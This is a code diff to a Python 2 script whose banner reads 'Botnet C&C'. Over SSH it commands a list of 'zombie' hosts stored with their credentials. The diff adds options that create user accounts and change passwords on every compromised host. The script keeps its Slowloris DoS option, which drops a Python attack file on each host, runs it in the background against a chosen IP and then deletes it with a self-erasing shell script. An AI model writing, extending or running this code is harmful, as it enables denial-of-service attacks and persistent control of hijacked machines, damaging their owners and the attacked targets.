@@ -1,14 +1,15 @@
 import paramiko
 import sys
-import time
 
 
 def init_text():
 	print "    ____          __                __     ______ ___     ______\n   / __ ) ____   / /_ ____   ___   / /_   / ____/( _ )   / ____/\n  / __  |/ __ \ / __// __ \ / _ \ / __/  / /    / __ \/|/ /\n / /_/ // /_/ // /_ / / / //  __// /_   / /___ / /_/  </ /__\n/_____/ \____/ \__//_/ /_/ \___/ \__/   \____/ \____/\/\____/\n" 
 	print "1: Zombie list"
 	print "2: Heartbeat"
-	print "3: DoS attack"
-	print "4: Specific command"
+	print "3: Add user"
+	print "4: Change user password"
+	print "5: Slowloris DoS attack"
+	print "6: Specific command"
 	return raw_input("\nOption: ")
 
 
@@ -31,7 +32,6 @@ def dos_attack(users,attacked_ip):
 	cmd_execute_file1 = "nohup python "+py_file+" "+attacked_ip+" >/dev/null 2>&1 &"
 	cmd_create_file2  = """echo -e '#!/sh\nsleep """+timeout+"""\nkillall python\nrm """+py_file+"""\nrm """+sh_file+"""' > """+sh_file+""""""
 	cmd_execute_file2 = "nohup sh "+sh_file+" >/dev/null 2>&1 &"
-
 	for u in users:
 		if len(u)>2:
 			try:
@@ -47,15 +47,32 @@ def dos_attack(users,attacked_ip):
 			except:
 				print "Error reading "+u
 				pass
-			
 
 
 def heartbeat(users,user_ip):
 	cmd_="ping "+user_ip+" -c 1"
+	specific_cmd(users, cmd_)
+	'''
 	for u in users:
 		if len(u)>2:
 			try:
 				ip_,uname_,pwd_=u.split("-")
+				exec_cmd(ip_,uname_,pwd_,cmd_)
+			except:
+				print "Error"
+	'''
+
+def add_user(users,username):
+	cmd_="sudo -S useradd "+username+" "
+	specific_cmd(users, cmd_)
+
+
+def change_pwd(users,username,password):
+	for u in users:
+		if len(u)>2:
+			try:
+				ip_,uname_,pwd_=u.split("-")
+				cmd_='echo -e "'+pwd_+'\n'+username+':'+password+'" | sudo -S chpasswd'
 				exec_cmd(ip_,uname_,pwd_,cmd_)
 			except:
 				print "Error"
@@ -80,11 +97,9 @@ def exec_cmd(ip_,uname_,pwd_,cmd_,log=True):
 	stdin.write(pwd_+'\n')
 	stdin.flush()
 	if log is True:
-		print "\nResponse from %s: " %(ip_)
-		#print "\nOutput:"
+		print "\nOutput from %s: " %(ip_)
 		for line in stdout:
-		    print(line.replace("\n",""))
-		#print "\nError:"
+			print(line.replace("\n",""))
 		for line in stderr:
 			print(line.replace("\n",""))
 		print "--------------------------------------------"
@@ -100,9 +115,16 @@ def main():
 		user_ip=raw_input("Your IP:")
 		heartbeat(users,user_ip)
 	elif option == "3":
+		username=raw_input("Username:")
+		add_user(users,username)
+	elif option == "4":
+		username=raw_input("Username:")
+		password=raw_input("Password:")
+		change_pwd(users,username,password)
+	elif option == "5":
 		attacked_ip=raw_input("Attack ip:")
 		dos_attack(users,attacked_ip)
-	elif option == "4":
+	elif option == "6":
 		if len(sys.argv) >=2:
 			cmd_=sys.argv[1]
 			print "Command:",cmd_
